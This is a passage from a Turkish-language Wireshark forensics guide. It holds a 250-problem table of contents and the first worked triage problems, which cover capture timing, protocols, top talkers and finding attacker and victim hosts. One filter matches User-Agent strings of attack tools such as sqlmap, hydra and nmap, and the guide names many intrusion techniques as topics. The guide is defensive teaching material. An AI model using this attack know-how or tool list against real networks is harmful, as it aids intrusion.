# Wireshark DFIR Problem Kılavuzu (250 Vaka)

> **Bu kılavuz kimin için?** Wireshark'ı açıp "şimdi ne yapacağım, hangi çekmeceyi açacağım?" diye donup kalan herkes için. Toy olman sorun değil; bu kılavuz tam da o anı, yani "problem geldiğinde nasıl düşüneceğini" öğretmek için yazıldı. Her terim açıklanır, her filtreden sonra adım adım yol tarifi verilir.

## Önce Wireshark'ın mantığı (toy başlangıç)

Wireshark bir **ağ dinleme ve çözümleme** aracıdır. Ağdan geçen her paketi (küçük veri zarfı) yakalar ve sana **katman katman** açar. Mantığını üç cümlede özetleyelim:

1. **Her paket bir mektuptur.** Üstünde zarf bilgileri (kimden, kime, hangi protokol), içinde de asıl içerik (yük/payload) vardır. Wireshark bu mektubu açıp her satırını okunur hale getirir.
2. **Paketler tek başına anlam taşımaz, konuşma (stream) halinde anlam taşır.** Bir TCP bağlantısındaki onlarca paket, aslında tek bir diyalogdur. O yüzden en çok kullanacağın özellik **Follow Stream**'dir (diyaloğu baştan sona okuma).
3. **Sen her paketi tek tek okumazsın; filtreyle süzer, istatistikle haritalarsın.** Binlerce paket içinde boğulmamanın yolu önce yukarıdan bakmak (Statistics menüsü), sonra şüpheli yere inmektir.

## "Problem gelince hangi çekmeceyi açacağım?" — Karar çerçevesi

Panik anında şu 4 adımı sırayla uygula. Bu, bütün kılavuzun özüdür:

1. **Bağlamı oku.** Bu kayıt neden elinde? Bir alarm mı, bir CTF sorusu mu, bir şikâyet mi? Soru sana yönü verir.
2. **Triage yap (genel resim).** `Statistics` menüsü senin haritandır. Kaç paket, hangi protokoller, kim en çok konuşmuş, Wireshark neyi "tuhaf" bulmuş? (Problem 001)
3. **Hipotez kur.** Tek bir cümle: "X, Y'yi taradı, Z portundan girdi." Belirsizse birkaç rakip hipotez yaz. (Problem 229)
4. **Çekmeceyi seç ve doğrula.** Baskın protokole göre doğru bölüme git, sadece hipotezini test eden filtreyi uygula, bulguyu en az iki kanıtla doğrula. (Problem 230, 231)

**Hangi dünyadasın? → Hangi çekmece (bölüm):**

| Trafikte baskın olan | Muhtemel senaryo | Bak: Bölüm |
| --- | --- | --- |
| Çok TCP SYN, çok port | Tarama / keşif | **C** |
| Çok DNS | Tünelleme, DGA, C2 | **D** ve **H** |
| Çok HTTP | Web saldırısı, indirme | **E** ve **H** |
| Çok TLS / şifreli | SNI, sertifika, JA3, zamanlama | **F** |
| Çok SMB / Kerberos / LDAP | Windows / AD yanal hareket | **G** |
| ARP / DHCP / ICMP tuhaflıkları | Yerel ağ / MITM | **B** |
| FTP, Telnet, SMTP, SNMP (şifresiz) | Açık kimlik/veri | **I** |
| "Yavaş", "çalışmıyor", "nasıl yaparım" | Yöntem / performans / araç | **J** |

## Nasıl okunur? Her problemin anatomisi

Her problem (toplam 250) şu parçalardan oluşur:

- **Metafor** — Konuyu günlük hayattan bir benzetmeyle anlatır (toy dostu).
- **Senden istenen** — Bu tip soruda gerçekte ne isteniyor?
- **Filtreler (araştırma yolu)** — Kopyala-yapıştır çalışan, **tshark ile doğrulanmış** display filtreleri. Her birinin yanında ne işe yaradığı yazar.
- **Menü / araç** — Wireshark menüsünde tıklayacağın yer.
- **Komut satırı** — Gerektiğinde tshark/tcpdump komutları.
- **Filtreden sonra yol tarifi** — Filtreyi uyguladıktan sonra çözüme kadar adım adım ne yapacağın. Bu kılavuzun kalbi budur.
- **Terimler** — Geçen her teknik terimin kısa açıklaması.
- **Anlık karar** — O senaryoda "nasıl düşünmen, hangi kararı vermen" gerektiğinin özeti.

> **Not:** Bu kılavuzdaki tüm display ve capture filtreleri Wireshark/tshark 4.x ile sözdizimsel olarak test edilmiştir. IP adresleri (10.0.0.x, 203.0.113.x) ve dosya adları örnektir; kendi vakandaki değerlerle değiştir.

> **Etik ve kapsam:** Bu kılavuz **savunma ve adli inceleme (DFIR)** içindir: yakalanmış trafiği okumak, saldırıyı tespit etmek ve raporlamak. Teknikler "bu izi kayıtta nasıl görürüm ve yorumlarım" bakışıyla anlatılmıştır. Analizi her zaman yetkin olduğun, izole bir ortamda yap.

## İçindekiler — 250 problem tek listede

**A · İlk Temas: Triage ve Wireshark'ta Yön Bulma**

- 001 · Elime bir pcap geldi, ilk 5 dakikada ne yaparım?
- 002 · Kayıt ne zaman başlamış, ne kadar sürmüş?
- 003 · Bu trafikte hangi protokoller var?
- 004 · En çok konuşan IP'ler kim? (Top talkers)
- 005 · Saldırgan IP'yi nasıl tespit ederim?
- 006 · Kurban (iç ağdaki) makineyi nasıl bulurum?
- 007 · Saat dilimi karmaşası: zaman damgalarını doğru okumak
- 008 · Olayın ilk paketini (sıfır anı) bulmak
- 009 · Belirli bir zaman aralığına odaklanmak
- 010 · Dev pcap dosyası açılmıyor veya çok yavaş
- 011 · Birden fazla pcap'i birleştirmek ve sıralamak
- 012 · Bir TCP konuşmasını baştan sona okumak (Follow Stream)
- 013 · Stream numarasıyla gezinmek: tcp.stream mantığı
- 014 · Paket detayında aradığım alanın filtre adını bulmak
- 015 · Gürültüyü elemek: bilinen iyi trafiği dışarıda bırakmak
- 016 · Paketlerde bir kelime veya string aramak (Find Packet)
- 017 · Standart dışı port: Wireshark protokolü tanımıyor (Decode As)
- 018 · Hostname'leri görmek: isim çözümleme ayarları
- 019 · DFIR için özel profil ve sütunlar kurmak
- 020 · Kritik paketleri işaretleyip yorumlamak (mark/comment)
- 021 · Bulguyu ayrı bir pcap olarak dışa aktarmak (kanıt alt kümesi)
- 022 · Expert Info ile anormallikleri hızla görmek
- 023 · Zaman içinde trafik grafiği: IO Graph ile ani artış (spike) bulmak
- 024 · Kaç paket, kaç byte? Sayma ve istatistik soruları
- 025 · Pcap'in değişmediğini kanıtlamak: hash ve kanıt bütünlüğü

**B · Yerel Ağ ve IP Katmanı: ARP, DHCP, ICMP, IPv6, VLAN**

- 026 · ARP spoofing / MITM tespiti
- 027 · Gratuitous ARP fırtınası
- 028 · ARP taraması ile ağ keşfi (host discovery)
- 029 · MAC flooding / CAM tablosu taşırma
- 030 · Sahte (rogue) DHCP sunucusu
- 031 · DHCP starvation (havuz tüketme) saldırısı
- 032 · Bir IP'nin hangi cihaza (MAC/hostname) ait olduğunu bulmak
- 033 · ICMP ping sweep (ağ taraması)
- 034 · ICMP tünelleme ile veri sızdırma
- 035 · Ping of Death ve anormal ICMP boyutları
- 036 · ICMP redirect ile trafik yönlendirme
- 037 · Traceroute izlerini tanımak (TTL exceeded)
- 038 · TTL anomalileri ile spoof ve işletim sistemi tahmini
- 039 · IP fragmentation ile IDS atlatma
- 040 · Sahte (spoofed) kaynak IP tespiti
- 041 · IPv6 Router Advertisement (RA) saldırısı / SLAAC MITM
- 042 · IPv6 tünelleri (6to4, Teredo) ve gizli kanal
- 043 · VLAN hopping (double tagging)
- 044 · STP manipülasyonu (root bridge saldırısı)
- 045 · CDP/LLDP ile ağ cihazı bilgi sızıntısı
- 046 · Broadcast ve multicast fırtınası
- 047 · Bir hostun MAC adresi değişmiş (MAC spoofing)
- 048 · HSRP/VRRP üzerinden gateway ele geçirme
- 049 · GRE / IP-in-IP tünel içindeki trafiği görmek
- 050 · Duplicate IP (IP çakışması) tespiti

**C · TCP/UDP Davranışı: Taramalar, Flood ve Bağlantı Anomalileri**

- 051 · TCP üçlü el sıkışmayı okumak (SYN, SYN-ACK, ACK)
- 052 · SYN taraması (yarı açık port taraması) tespiti
- 053 · Hangi portlar açık çıktı? Tarama sonucunu okumak
- 054 · TCP Connect taraması
- 055 · FIN / NULL / Xmas taramaları
- 056 · ACK taraması (firewall haritalama)
- 057 · UDP port taraması
- 058 · Nmap servis/versiyon/OS tespiti izleri
- 059 · SYN flood (DoS)
- 060 · UDP flood ve amplifikasyon (DNS, NTP, memcached)
- 061 · Bağlantı sürekli RST ile kesiliyor
- 062 · TCP retransmission fırtınası: ağ sorunu mu, saldırı mı?
- 063 · Zero window: uygulama veri alamıyor
- 064 · TCP oturum ele geçirme (session hijacking) ve RST enjeksiyonu
- 065 · Yavaş saldırılar: Slowloris ve benzerleri
- 066 · Uzun süreli bağlantıları (long-lived connections) bulmak
- 067 · Bilinen portta farklı protokol (port/protokol uyumsuzluğu)
- 068 · Yüksek portlar arası şüpheli iletişim
- 069 · Dışarıdan içeriye beklenmeyen bağlantı (inbound)
- 070 · Bağlantı başarılı mı başarısız mı? (tcp.completeness)
- 071 · Bir bağlantıda ne kadar veri aktarıldı?
- 072 · Seq/ack ile kayıp veriyi ayırt etmek (kayıt mı eksik, ağ mı?)
- 073 · Banner grabbing tespiti
- 074 · Telnet/SSH/FTP brute force: çok sayıda kısa bağlantı
- 075 · Bağlantıların zaman çizelgesi: ilk ve son temas

**D · DNS: Ağın Telefon Rehberi**

- 076 · Bir makinenin hangi alan adlarını sorguladığını listelemek
- 077 · DNS tünelleme tespiti (uzun alt alan adları)
- 078 · TXT kayıtları ile komut ve veri taşıma
- 079 · DGA (rastgele üretilmiş alan adları) tespiti
- 080 · NXDOMAIN fırtınası
- 081 · Fast flux (sürekli değişen IP'ler)
- 082 · DNS spoofing / cache poisoning
- 083 · Zone transfer (AXFR) ile bilgi sızıntısı
- 084 · Şüpheli alan adının hangi IP'ye çözüldüğünü bulmak
- 085 · DNS sorgusunu sonraki bağlantıyla eşleştirmek
- 086 · İç DNS yerine dış DNS kullanan makine
- 087 · DNS over HTTPS (DoH) ve DNS over TLS (DoT) tespiti
- 088 · DNS ile veri sızdırma: alt alan adlarında kodlanmış veri
- 089 · Yeni ve nadir görülen alan adlarını ayıklamak
- 090 · Typosquatting ve benzer alan adları
- 091 · Dinamik DNS (DDNS) servislerinin kullanımı
- 092 · DNS amplification saldırısı (ANY sorguları)
- 093 · Cevapsız kalan DNS sorguları
- 094 · mDNS, LLMNR ve NBNS ile isim çözümleme izleri
- 095 · PTR (ters DNS) sorguları ile iç keşif
- 096 · DNS TTL değeri çok düşük alanlar
- 097 · Bir alan adını hangi makinelerin sorguladığı (etki genişliği)
- 098 · DNS sorgu ID ve transaction eşleştirme
- 099 · DNS üzerinden saldırgan altyapısını (IOC) çıkarmak
- 100 · WPAD ve ISATAP sorguları ile proxy zehirleme

**E · HTTP ve Web Saldırıları**

- 101 · HTTP isteklerini listelemek: kim neyi istedi?
- 102 · Web dizin/dosya taraması (gobuster, dirb, ffuf) tespiti
- 103 · Zafiyet tarayıcı izleri (Nikto, sqlmap, Nmap NSE, WPScan) ve User-Agent
- 104 · SQL Injection denemeleri
- 105 · Başarılı SQLi'yi başarısızdan ayırmak
- 106 · XSS (Cross-Site Scripting) denemeleri
- 107 · Directory traversal ve LFI (yerel dosya okuma)
- 108 · Remote File Inclusion (RFI)
- 109 · Komut enjeksiyonu (Command Injection)
- 110 · Web shell yüklenmesi (file upload)
- 111 · Web shell ile komut çalıştırma trafiği
- 112 · Brute force login (POST form)
- 113 · HTTP Basic Auth parolasını çözmek
- 114 · Cookie ve oturum çalma (session hijacking)
- 115 · HTTP üzerinden indirilen dosyayı çıkarmak (Export Objects)
- 116 · Zararlı executable indirildi mi? (MZ başlığı)
- 117 · Log4Shell (JNDI) istismar denemesi
- 118 · Shellshock istismarı
- 119 · HTTP yanıt kodlarıyla saldırının seyrini okumak
- 120 · Şüpheli User-Agent'lar (PowerShell, curl, wget, python)
- 121 · HTTP POST ile veri sızdırma
- 122 · Admin paneli ve login sayfası keşfi
- 123 · SSRF ve iç kaynaklara yapılan istekler
- 124 · XXE (XML External Entity)
- 125 · HTTP/2 trafiğini okumak

**F · TLS, Şifreli Trafik, SSH, VPN ve QUIC**

- 126 · Şifreli trafikte hangi siteye gidildiğini bulmak (SNI)
- 127 · TLS el sıkışmasını okumak
- 128 · SSLKEYLOGFILE ile TLS çözmek
- 129 · RSA private key ile TLS çözmek (eski senaryolar)
- 130 · Sertifika bilgilerini incelemek (kime verilmiş?)
- 131 · Self-signed ve şüpheli sertifika tespiti
- 132 · JA3/JA4 parmak izi ile zararlı istemci tespiti
- 133 · TLS üzerinden C2 beaconing
- 134 · Eski/zayıf TLS sürümü ve şifre takımı (downgrade)
- 135 · SNI olmayan veya doğrudan IP'ye yapılan TLS bağlantıları
- 136 · Standart dışı portta TLS
- 137 · TLS alert'leri ve başarısız el sıkışmalar
- 138 · Sertifika zinciri ve son kullanma tarihi
- 139 · Ücretsiz sertifikalı yeni alan adları (Let's Encrypt vb.)
- 140 · QUIC (HTTP/3) trafiğini tanımak
- 141 · ECH/ESNI: SNI'nin gizlendiği durumlar
- 142 · SSH trafiği analizi (sürüm, brute force, oturum)
- 143 · SSH tünelleme ve port forwarding şüphesi
- 144 · Şifreli trafikte veri sızdırma: hacim analizi
- 145 · Tor trafiği tespiti
- 146 · VPN protokollerini tanımak (OpenVPN, WireGuard, IPsec)
- 147 · TLS session resumption ile oturum takibi
- 148 · Şifreli DNS (DoH) ile TLS bağlantıları arasında korelasyon
- 149 · Domain fronting şüphesi
- 150 · TLS çözüldükten sonra HTTP içeriğini dışa aktarmak

**G · Windows ve Active Directory Olay İncelemesi: SMB, NTLM, Kerberos, LDAP, RPC, RDP**

- 151 · SMB ile hangi dosyalara erişildi?
- 152 · SMB üzerinden aktarılan dosyayı adli olarak çıkarmak
- 153 · SMB'de başarısız oturum açma dalgası
- 154 · NTLM kimlik doğrulamasından hesap ve makine adını okumak
- 155 · NTLM relay belirtileri
- 156 · Kerberos ön kimlik doğrulama hataları
- 157 · AS-REP roasting belirtileri
- 158 · Kerberoasting (servis bileti isteme dalgası)
- 159 · Golden/Silver ticket ve anormal bilet belirtileri
- 160 · LDAP ile dizin keşfi
- 161 · LDAP oturum açma ve düz metin bind
- 162 · DCE/RPC ile uzaktan yönetim çağrıları
- 163 · Uzaktan servis oluşturma (PsExec benzeri) izleri
- 164 · Zamanlanmış görev ve WMI ile uzaktan çalıştırma
- 165 · RDP bağlantılarını incelemek
- 166 · İç ağda yanal hareketi izlemek
- 167 · WinRM / PowerShell Remoting trafiği
- 168 · Pass-the-hash belirtileri (ağ perspektifinden)
- 169 · SMB sürüm düşürme ve eski protokol kullanımı
- 170 · NetBIOS/SMB ile paylaşım ve host keşfi
- 171 · Kerberos üzerinden kullanıcı hesaplarını eşleştirmek
- 172 · MS-RPC üzerinden dizin çoğaltma (replikasyon) çağrıları
- 173 · SMB üzerinden NTLM taşınan oturumları toplu çıkarmak
- 174 · DNS adlarının NetBIOS/LLMNR ile doğrulanmaya çalışılması (zehirleme ortamı)
- 175 · DC'ye yönelik olağan dışı kimlik doğrulama yoğunluğu

**H · Zararlı Yazılım, C2 ve Veri Sızdırma Trafiği**

- 176 · C2 beaconing: düzenli aralıklı "yoklama" trafiği
- 177 · Beacon aralığını ve jitter'ı ölçmek
- 178 · Cobalt Strike belirtileri
- 179 · HTTP tabanlı C2 kanalını okumak
- 180 · İlk aşama yükleyici (stager/downloader) indirmesi
- 181 · Reverse shell trafiği (düz metin)
- 182 · PowerShell indirme ve çalıştırma (download cradle)
- 183 · DNS üzerinden C2 (TXT/CNAME tabanlı)
- 184 · Veri sızdırma: ne kadar, nereye, hangi kanal?
- 185 · Sıkıştırılmış/arşiv dosya sızdırması
- 186 · Bulut depolama ve meşru servisler üzerinden sızdırma
- 187 · İndirilen dosyanın gerçek türünü doğrulamak (magic bytes)
- 188 · XOR/basit şifrelemeyle gizlenmiş C2 verisi
- 189 · Ransomware ağ belirtileri
- 190 · Zararlının kullandığı altyapıyı (IOC) çıkarmak
- 191 · Zararlı bağlantıyı başlatan ilk olayı bulmak (kill chain başı)
- 192 · İkinci aşama / modül indirmelerini izlemek
- 193 · Tünelleme araçlarını (chisel, ngrok, iodine) tanımak
- 194 · Kripto madenciliği (cryptomining) trafiği
- 195 · Fidye/sızdırma sonrası veri boyutunu kanıtlamak
- 196 · Komut ve kontrol alanının yaşını ve itibarını değerlendirmek
- 197 · Enfeksiyon zincirini uçtan uca birleştirmek
- 198 · Fenomen "spray and pray" indirmeleri: tek makineden çok hedefe
- 199 · Zararlının "canlılık kontrolü" (connectivity check) istekleri
- 200 · Alan adı oluşturma hızına (yenilik) göre avlanmak

**I · Şifresiz Protokoller, E-posta, Dosya Transferi, VoIP ve IoT**

- 201 · FTP oturumunu ve komutlarını okumak
- 202 · FTP veri kanalından dosya çıkarmak
- 203 · Telnet oturumunu okumak
- 204 · SMTP ile gönderilen e-postayı incelemek
- 205 · POP3/IMAP ile okunan e-postalar ve kimlik bilgileri
- 206 · Oltalama (phishing) e-postası ve zararlı ek/link
- 207 · SMTP/e-posta ile veri sızdırma
- 208 · TFTP ile dosya transferi (ağ cihazı yapılandırmaları)
- 209 · SNMP ile cihaz bilgisi ve community string
- 210 · Düz metin HTTP formlarında parola yakalamak
- 211 · VoIP/SIP çağrılarını analiz etmek (kim kimi aradı)
- 212 · RTP ses akışını çıkarıp dinlemek
- 213 · MQTT ve IoT mesajlaşma trafiği
- 214 · Modbus/SCADA endüstriyel kontrol trafiği
- 215 · IRC tabanlı botnet kontrolü
- 216 · LPD/IPP yazıcı ve diğer ofis protokolleri
- 217 · NTP ve zaman manipülasyonu
- 218 · Kerberos öncesi: RADIUS/TACACS kimlik doğrulama
- 219 · DHCP ile ağ envanteri ve işletim sistemi parmak izi
- 220 · Şifresiz web oturumunda hassas veri (kişisel bilgi/kart)
- 221 · SMB/NetBIOS üzerinden yazıcı ve paylaşım gözatma
- 222 · Düz metin veritabanı trafiği (MySQL, PostgreSQL, MSSQL)
- 223 · Kablosuz (Wi-Fi) yönetim çerçeveleri ve deauth saldırısı
- 224 · Syslog akışında güvenlik olaylarını okumak
- 225 · Kerberos/LDAP olmadan düz metin dizin ve kimlik servisleri

**J · Yöntem, Performans, Adli Titizlik, Araçlar ve Raporlama**

- 226 · Capture filtresi mi, display filtresi mi? İkisinin farkı
- 227 · Temel BPF capture filtreleri (host, port, net)
- 228 · Gelişmiş BPF: bayrak ve byte seviyesi yakalama
- 229 · Doğru yerden yakalamak: sensör yerleşimi
- 230 · Promiscuous ve monitor mod: neden sadece kendi trafiğimi görüyorum?
- 231 · Paket yakalama kaybı (dropped packets)
- 232 · Zaman referansı ve göreli zamanlama (Set/Find Time Reference)
- 233 · Doğru soruyu sormak: analiz öncesi hipotez kurmak
- 234 · Karar ağacı: protokole göre doğru çekmeceyi seçmek
- 235 · Yanlış pozitif ve doğrulama: tek kanıtla hüküm vermemek
- 236 · GeoIP ile hedeflerin coğrafi konumu
- 237 · tshark ile toplu çıkarım ve otomasyon
- 238 · CyberChef ile kodlanmış/şifreli veriyi çözmek
- 239 · İşaretleme ve profil: tekrar eden analizleri hızlandırmak
- 240 · Protokol tercihlerini ayarlamak (reassembly, checksum)
- 241 · NAT arkası: gerçek iç IP'yi bulmak
- 242 · Kanıt zinciri (chain of custody) ve dosya bütünlüğü
- 243 · Pcap'i güvenli incelemek (zararlı tetiklememek)
- 244 · Bulguları zaman çizelgesine dökmek
- 245 · DFIR raporunu yazmak: bulgudan anlatıya
- 246 · Ekran görüntüsü ve kanıt alıntısı almak
- 247 · Çıkmaza girince: tıkanınca ne yapmalı?
- 248 · Ağ hızı/performans analizi: yavaşlığın kaynağı ağ mı uygulama mı?
- 249 · İlgisiz görünen iki olayı ilişkilendirmek (korelasyon)
- 250 · Öğrenmeye devam: kendi laboratuvarını kurmak ve pratik yapmak

---

## A · İlk Temas: Triage ve Wireshark'ta Yön Bulma

*Pcap elinde, panik yok. Bu bölüm "nereden başlarım, nasıl gezinirim, nasıl ölçerim" sorularının cevabı. Diğer 225 problemin hepsi bu 25 refleksin üstüne kurulur.*

<details>
<summary><strong>001 · Elime bir pcap geldi, ilk 5 dakikada ne yaparım?</strong></summary>

**Metafor:** Bir olay yerine giren dedektif önce cesede değil odaya bakar: kaç kapı var, kim girmiş, saat kaç? Pcap'te de önce genel resme bakarsın, paketlere sonra dalarsın.

**Senden istenen:** Çoğu soru "saldırgan kim, kurban kim, ne zaman, ne yapıldı" dörtlüsünden biridir. İlk 5 dakikanın amacı bu dört sorunun hangisine yakın olduğunu kestirmek.

**Filtreler (araştırma yolu):**

- `tcp.flags.syn == 1 && tcp.flags.ack == 0` → bağlantı başlatma denemeleri (kim kime kapı çaldı)
- `http.request || dns.flags.response == 0 || tls.handshake.type == 1` → insan okunur "niyet" paketleri: web isteği, DNS sorgusu, TLS hello

**Menü / araç:**

- Statistics ▸ Capture File Properties → kayıt süresi, paket sayısı, başlangıç/bitiş saati
- Statistics ▸ Protocol Hierarchy → hangi protokoller var, yüzde kaçlık yer kaplıyor
- Statistics ▸ Conversations (IPv4 + TCP sekmeleri) → kim kiminle ne kadar konuştu
- Analyze ▸ Expert Information → Wireshark'ın kendi "bu tuhaf" dediği yerler

**Filtreden sonra yol tarifi:**

1. Capture File Properties'ten başlangıç ve bitiş saatini not defterine yaz. Her bulguyu bu zaman çizgisine yerleştireceksin.
2. Protocol Hierarchy'de beklenmedik protokol ara (ör. iç ağda IRC, FTP, Telnet, büyük oranda DNS). Beklenmedik olan, ipucudur.
3. Conversations ▸ IPv4 sekmesinde Bytes sütununa göre sırala. En üstteki 3-5 çift genelde hikâyenin baş rolleridir.
4. SYN filtresini uygula. Tek IP'nin çok sayıda farklı porta/IP'ye SYN atması tarama demektir, saldırgan adayı odur.
5. "Niyet" filtresiyle DNS sorguları ve HTTP isteklerine göz gezdir. Alan adları ve URL'ler hikâyeyi en hızlı anlatan yerdir.
6. Bir hipotez kur ("10.0.0.5 tarama yapmış, sonra 10.0.0.20'ye girmiş") ve sonraki adımda sadece bu hipotezi doğrulayan/çürüten filtreleri kullan.

**Terimler:**

- **pcap / pcapng**: Ağ trafiğinin kaydedildiği dosya formatı. pcapng yeni sürüm; yorum, arayüz bilgisi gibi ekstra veri tutabilir.
- **Triage**: Acil serviste hastaları önceliklendirmek gibi; her şeyi incelemeden önce neye öncelik vereceğine karar verme aşaması.
- **Conversation**: İki uç nokta (IP veya IP:port çifti) arasındaki tüm trafik.

> **Anlık karar:** İlk 5 dakikada tek paket bile açmana gerek yok. İstatistik menüsü haritadır, paket listesi sokaktır. Haritaya bakmadan sokağa girme.


</details>

<details>
<summary><strong>002 · Kayıt ne zaman başlamış, ne kadar sürmüş?</strong></summary>

**Metafor:** Bir güvenlik kamerası kaydında ilk iş, kaydın saat damgasına bakmaktır. Saati bilmeden "hırsız gece mi girdi" diyemezsin.

**Senden istenen:** "Saldırı hangi tarihte/saatte başladı?", "Kayıt kaç saniye sürdü?" gibi sorular.

**Filtreler (araştırma yolu):**

- `frame.number == 1` → ilk paket, gerçek başlangıç anı

**Menü / araç:**

- Statistics ▸ Capture File Properties → First packet, Last packet, Elapsed
- View ▸ Time Display Format ▸ Date and Time of Day (Ctrl+Alt+1) → her paketin gerçek saatini gösterir

**Komut satırı:**

```bash
capinfos -aeu kanit.pcapng
```

**Filtreden sonra yol tarifi:**

1. Capture File Properties penceresini aç ve First/Last packet değerlerini kopyala.
2. Zaman formatını "Date and Time of Day" yap. Varsayılan "Seconds Since Beginning of Capture" sadece göreli süredir, soru gerçek saat istiyorsa bu yanıltır.
3. Soru UTC istiyorsa View ▸ Time Display Format ▸ UTC Date and Time of Day seç.
4. Komut satırında capinfos ile aynı bilgiyi doğrula (-a ilk, -e son paket zamanı, -u süre).
5. Cevabı yazarken saat dilimini mutlaka belirt (ör. 2024-03-01 14:22:05 UTC).

**Terimler:**

- **Zaman damgası (timestamp)**: Paketin yakalandığı an. Paketin içinde değil, yakalayan cihazın saatinden gelir.
- **UTC**: Dünya ortak saati. Türkiye UTC+3'tür.
- **capinfos**: Wireshark ile gelen, pcap hakkında özet bilgi veren komut satırı aracı.

> **Anlık karar:** Cevap saat istiyorsa önce "hangi saat dilimi?" diye sor. CTF'lerde en sık kaybedilen puan, doğru saat yanlış dilimdir.


</details>

<details>
<summary><strong>003 · Bu trafikte hangi protokoller var?</strong></summary>

**Metafor:** Bir binaya girdiğinde hangi dillerin konuşulduğunu duymak, kimlerin orada olduğunu anlatır. Protocol Hierarchy binadaki dil haritasıdır.

**Senden istenen:** "Kayıtta hangi uygulama katmanı protokolleri kullanılmış?", "Şifrelenmemiş protokol var mı?"

**Filtreler (araştırma yolu):**

- `!tcp && !udp && !arp` → TCP/UDP dışı egzotik trafik (ICMP, GRE, ESP vb.)
- `ftp || telnet || pop || imap || smtp || http || snmp` → düz metin (şifresiz) protokoller
- `data` → Wireshark'ın tanıyamadığı ham veri, gizli kanal adayı

**Menü / araç:**

- Statistics ▸ Protocol Hierarchy → sağ tık ▸ Apply as Filter ▸ Selected ile istediğin protokole tek tıkla filtre

**Filtreden sonra yol tarifi:**

1. Protocol Hierarchy'de "Percent Bytes" sütununa bak. Az paketli ama çok byte'lı protokol veri aktarımı demektir.
2. Listede "Data" satırı varsa üzerine sağ tıklayıp filtre olarak uygula. Tanınmayan veri ya standart dışı porttur ya özel bir C2'dir.
3. Düz metin protokolleri filtresiyle parola ve komut taşıyan oturumları bul, sonra Follow Stream ile oku.
4. Beklenmedik protokol bulduğunda Conversations ile hangi IP'lerin kullandığına bak.

**Terimler:**

- **Protokol**: İki tarafın konuşurken uyduğu kurallar seti (dil gibi).
- **Düz metin (cleartext)**: Şifrelenmemiş, okunabilir veri.
- **Data**: Wireshark'ın protokolünü çözemediği için ham byte olarak gösterdiği yük.

> **Anlık karar:** "Data" satırı her zaman şüphelidir. Önce Decode As ile tanıtmayı dene (Problem 017), olmuyorsa Follow Stream ile içeriğe bak.


</details>

<details>
<summary><strong>004 · En çok konuşan IP'ler kim? (Top talkers)</strong></summary>

**Metafor:** Kalabalık bir odada en çok konuşanlar genelde ya ev sahibidir ya da sorun çıkaran misafir. İkisini ayırmak senin işin.

**Senden istenen:** "En çok veri gönderen host hangisi?", "Hangi IP en çok bağlantı kurdu?"

**Menü / araç:**

- Statistics ▸ Endpoints ▸ IPv4 → Packets/Bytes sütununa göre sırala
- Statistics ▸ Conversations ▸ IPv4 → çift bazında; "Bytes A→B" ve "Bytes B→A" yönü ayırır

**Komut satırı:**

```bash
tshark -r kanit.pcapng -q -z endpoints,ip
tshark -r kanit.pcapng -q -z conv,ip
```

**Filtreden sonra yol tarifi:**

1. Endpoints'te en üstteki IP'leri not al. İç ağ (10.x, 172.16-31.x, 192.168.x) mı dış ağ mı ayır.
2. Conversations'ta yönü incele: iç IP'den dışa doğru büyük "Bytes A→B" veri sızdırmaya, dıştan içe büyük veri indirmeye işaret eder.
3. "Duration" sütunu uzun ama byte'ı az olan konuşmalar beacon/C2 olabilir (Problem 176).
4. Şüpheli çifte sağ tıkla ▸ Apply as Filter ▸ Selected ▸ A↔B ve detaya in.

**Terimler:**

- **Endpoint**: Trafiğin uç noktası; tek bir IP (veya MAC, port).
- **Top talker**: En çok paket/byte üreten uç nokta.
- **Private IP**: İnternette yönlendirilmeyen, iç ağlara ayrılmış adres blokları.

> **Anlık karar:** Çok konuşan her zaman kötü değildir (Windows Update, yedekleme). Hacim + yön + hedef birlikte değerlendirilir.


</details>

<details>
<summary><strong>005 · Saldırgan IP'yi nasıl tespit ederim?</strong></summary>

**Metafor:** Hırsız genelde önce kapıları tek tek yoklar. Ağda "kapı yoklamak" çok sayıda porta veya hosta kısa bağlantı denemesi demektir.

**Senden istenen:** CTF ve vaka sorularının bir numarası: "Saldırganın IP adresi nedir?"

**Filtreler (araştırma yolu):**

- `tcp.flags.syn == 1 && tcp.flags.ack == 0` → bağlantı denemeleri; tek kaynaktan çok sayıda varsa tarayıcı/saldırgan
- `tcp.flags.reset == 1` → kapalı portlardan dönen RST'ler; hedefi ve tarayanı gösterir
- `http.user_agent matches "sqlmap|nikto|nmap|gobuster|dirb|wfuzz|hydra|curl|python"` → saldırı aracı imzaları
- `http.response.code == 404` → dizin taramasında 404 yağmuru olur

**Filtreden sonra yol tarifi:**

1. SYN filtresini uygula, ardından Statistics ▸ Endpoints ▸ IPv4 sekmesinde "Limit to display filter" kutusunu işaretle. En çok SYN atan IP birinci aday.
2. Statistics ▸ Conversations ▸ TCP'de o IP'nin kaç farklı porta gittiğine bak. Yüzlerce port = port taraması.
3. Web saldırısı varsa User-Agent filtresini dene. Araç adı açıkça yazıyorsa saldırgan IP'si o isteğin kaynağıdır.
4. Adayı doğrula: aynı IP sonra başarılı bir bağlantı/oturum açmış mı (SYN-ACK almış, veri aktarmış)?
5. Cevabı yazmadan önce NAT/proxy olasılığını düşün; gördüğün IP bir ağ geçidi de olabilir (Problem 238).

**Terimler:**

- **Port taraması**: Hangi servislerin açık olduğunu öğrenmek için çok sayıda porta bağlantı denemesi.
- **User-Agent**: HTTP isteğinde "ben hangi programım" diyen başlık. Araçlar kendini bu başlıkla ele verir.
- **SYN**: TCP'de "konuşabilir miyiz?" diyen ilk paket.

> **Anlık karar:** Saldırgan = ilk "anormal" davranışı başlatan taraf. Kim önce kapı çaldı, kim çok kapı çaldı, kim yasak kapıyı açtı?


</details>

<details>
<summary><strong>006 · Kurban (iç ağdaki) makineyi nasıl bulurum?</strong></summary>

**Metafor:** Yangının çıktığı evi bulmak için dumanın nereden yükseldiğine bakarsın. Kurban makine; zararlı indiren, dışarıya beklenmedik bağlantı kuran veya saldırı alan makinedir.

**Senden istenen:** "Ele geçirilen makinenin IP/hostname'i nedir?", "Hangi kullanıcı hesabı etkilendi?"

**Filtreler (araştırma yolu):**

- `ip.dst == 10.0.0.20 && tcp.flags.syn == 1 && tcp.flags.ack == 1` → hedefin kabul ettiği (açık port) bağlantılar
- `http.request && ip.src == 10.0.0.20` → kurban adayının yaptığı web istekleri
- `dhcp || nbns || kerberos.CNameString` → IP'yi hostname/kullanıcıya bağlayan protokoller

**Filtreden sonra yol tarifi:**

1. Saldırganın hedeflediği IP'leri bul (Conversations'ta saldırgan IP'sini filtrele).
